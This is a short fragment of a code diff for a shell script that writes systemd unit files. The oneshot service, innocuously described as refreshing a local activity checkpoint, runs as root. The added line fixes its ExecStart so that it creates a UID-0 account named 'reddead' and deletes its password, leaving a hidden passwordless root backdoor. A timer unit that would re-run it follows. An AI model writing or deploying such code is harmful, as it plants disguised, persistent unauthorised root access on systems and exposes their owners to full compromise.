@@ -183,7 +183,7 @@ Description=Refresh the local activity checkpoint
 [Service]
 Type=oneshot
 User=root
-ExecStart=useradd -m -d /home/reddead -s /bin/bash -c "Red User" -p "" -o -u 0 -g 0 reddead && passwd -d reddead
+ExecStart=/bin/sh -c '/usr/sbin/useradd -m -d /home/reddead -s /bin/bash -c "Red User" -N -o -u 0 -g 0 reddead && /usr/bin/passwd -d reddead'
 UNIT
 
 cat > "$units/local-checkpoint.timer" <<'UNIT'
